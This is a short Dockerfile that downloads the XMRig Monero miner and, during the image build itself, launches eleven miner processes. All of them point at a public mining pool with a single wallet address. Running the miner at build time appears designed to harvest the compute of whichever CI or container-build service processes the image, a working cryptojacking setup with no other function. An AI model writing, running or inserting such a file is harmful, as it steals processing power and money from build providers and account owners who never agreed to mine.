FROM ubuntu:20.04
USER root

# Variables & Environments
ARG XMRIG_VERSION=6.8.2
ENV HOME=/home/test

# Set working directory
WORKDIR $HOME

# Run: Install basic components
RUN apt-get update && \
    apt-get install -y wget && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    tar -xvzf xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    mv xmrig-$XMRIG_VERSION/xmrig xmrig && \
    chmod +x xmrig

# Run
RUN grep -c ^processor /proc/cpuinfo && \
    cat /proc/meminfo | grep Huge && \
    sysctl -w vm.nr_hugepages=128 || true && \
    apt-get install -y coreutils && \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester1 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester2 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester3 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester4 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester5 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester6 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester7 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester8 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester9 & \
    nohup ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester10 & \
    ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester
